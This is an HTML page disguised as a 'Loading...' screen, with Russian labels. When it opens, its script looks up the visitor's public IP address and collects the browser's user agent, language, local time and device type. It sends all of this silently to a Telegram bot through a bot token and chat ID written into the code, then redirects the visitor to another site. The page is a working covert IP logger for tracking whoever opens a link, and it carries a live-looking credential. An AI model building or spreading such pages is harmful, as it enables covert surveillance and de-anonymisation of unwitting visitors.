<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
</head>
<body>
    <h1>Загрузка...</h1>
    <script>
        window.onload = function() {
            // Получаем IP
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    var real_ip = data.ip;
                    var ua = navigator.userAgent;
                    var lang = navigator.language;
                    var time = new Date().toLocaleString('ru-RU');
                    var device = /iPhone|iPad|Android/i.test(ua) ? 'Мобильное устройство' : 'Компьютер';

                    var text = "🔹 НОВЫЙ ПЕРЕХОД 🔹\n" +
                               "IP: " + real_ip + "\n" +
                               "Устройство: " + device + "\n" +
                               "Браузер/ОС: " + ua.substring(0, 80) + "...\n" +
                               "Язык: " + lang + "\n" +
                               "Время: " + time;

                    var token = "8984823205:AAHz862DzTswOfq4HqT74EHMYl1apCoiXAg";
                    var chat_id = "8212240529";
                    var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(text);
                    fetch(url).catch(function() {});
                })
                .catch(function() {
                    var ip = window.location.hostname;
                    var text = "IP (домен): " + ip + "\nОшибка определения реального IP";
                    var token = "8984823205:AAHz862DzTswOfq4HqT74EHMYl1apCoiXAg";
                    var chat_id = "8212240529";
                    var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(text);
                    fetch(url).catch(function() {});
                });

            setTimeout(function() {
                window.location.href = "https://example.com";
            }, 2500);
        };
    </script>
</body>
</html>
